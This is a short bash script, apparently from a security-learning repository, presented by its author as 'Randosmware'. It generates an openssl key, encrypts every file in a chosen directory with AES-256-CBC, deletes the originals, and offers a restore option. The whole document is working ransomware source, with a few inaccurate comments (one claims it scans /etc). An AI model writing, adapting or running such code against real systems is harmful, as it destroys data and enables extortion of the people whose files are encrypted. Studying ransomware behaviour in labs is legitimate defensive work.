#!/bin/bash
# Author: SergioZ3R0
# Randosmware that encrypts all non-critical system files and deletes them.
# Generals/randosmware.sh

# Variables
DIR="/home/kali/paquito"                   # Directory to encrypt
KEY="key.txt"                # Name of the text file with the key

# Function

# Generate the key
function generateKey(){
    echo "Generating key..."
    openssl rand -base64 32 > "$HOME/$KEY"
    echo "Generated key"
}

# Encrypt the files

function encrypt(){
    echo "Encriptando..."
    # Use find comand to find files and directories in /etc excluding /etc/passwd, /etc/shadow, /etc/sudoers and /etc/hosts
    find "$DIR" -mindepth 1 \( -type f ! -name passwd ! -name shadow ! -name sudoers ! -name hosts -o -type d \) -print0 | while IFS= read -r -d '' file; do
        openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -kfile "$HOME/$KEY" # Encrypt the file
        rm "$file"                                    # Delete the original file
    done
    echo "Encrypted and original files deleted"
}

# Restore files from encrypted files
function restore(){
    echo "Restaurando backup..."
    find "$DIR" -mindepth 1 \( -type f ! -name passwd ! -name shadow ! -name sudoers ! -name hosts -o -type d \) -print0 | while IFS= read -r -d '' file; do
        openssl enc -aes-256-cbc -d -in "$file" -out "${file%.enc}" -kfile "$HOME/$KEY" # Decrypt the file
        rm "$file"                                    # Delete the encrypted file
    done
    echo "Restored backup"
}

# Show help
function help(){
    echo "Uso: $0 [opciones]"
    echo "Opciones:"
    echo "  -h, --help      Show help"
    echo "  -g, --generate  Generate the key"
    echo "  -e, --encrypt   Encrypt the files"
    echo "  -r, --restore   Restore files"
}

# Main
case $1 in
    -h|--help)
        help
        ;;
    -g|--generate)
        generateKey
        ;;
    -e|--encrypt)
        encrypt
        ;;
    -r|--restore)
        restore
        ;;
    *)
        echo "Invalid option"
        help
        ;;
esac

## 3.2.2. Ransomware
